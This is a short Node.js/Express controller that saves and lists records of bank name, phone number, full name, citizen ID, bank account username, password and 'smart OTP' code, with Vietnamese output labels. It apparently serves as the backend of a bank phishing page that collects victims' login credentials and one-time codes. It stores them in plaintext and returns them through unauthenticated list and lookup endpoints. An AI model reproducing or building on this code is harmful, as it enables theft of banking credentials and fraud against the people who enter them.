const db = require("../models");

// create main model
const User = db.users;

// create product
const addUser = async (req, res) => {
	// create a User
	let info = {
		id: req.body.id,
		bankName: req.body.bankName,
		phone: req.body.phone,
		fullName: req.body.fullName,
		citizenId: req.body.citizenId,
		userName: req.body.userName,
		password: req.body.password,
		smartOtp: req.body.smartOtp,
	};

	// save user in the database
	try {
		const user = await User.create(info);
		res.status(200).send(user);
		console.log(user);
	} catch (err) {
		res.status(500).send({
			message: err.message || "Error occurred while creating the user",
		});
	}
};

// get all users
const getAllUsers = async (req, res) => {
	let users = await User.findAll({});

	// users.sort((user1, user2) => {
	// 	return user2.createdAt - user1.createdAt;
	// });

	let result = users.map((user) => {
		let element = {};
		element["Id"] = user.id;
		element["Tên ngân hàng"] = user.bankName;
		element["Số điện thoại"] = user.phone;
		element["Họ và tên"] = user.fullName;
		element["Chứng minh thư / CCCD"] = user.citizenId;
		element["Tên tài khoản"] = user.userName;
		element["Mật khẩu"] = user.password;
		element["Mã otp"] = user.smartOtp;
		element["Ngày tạo"] = user.createdAt;

		return element;
	});

	res.status(200).send(result);
};

// get single users
const getSingleUser = async (req, res) => {
	let id = req.params.id;
	let user = await User.findOne({ where: { id: id } });

	let element = {};
	element["Id"] = user.id;
	element["Tên ngân hàng"] = user.bankName;
	element["Số điện thoại"] = user.phone;
	element["Họ và tên"] = user.fullName;
	element["Chứng minh thư / CCCD"] = user.citizenId;
	element["Tên tài khoản"] = user.userName;
	element["Mật khẩu"] = user.password;
	element["Mã otp"] = user.smartOtp;
	element["Ngày tạo"] = user.createdAt;

	res.status(200).send(element);
};

module.exports = {
	addUser,
	getAllUsers,
	getSingleUser,
};
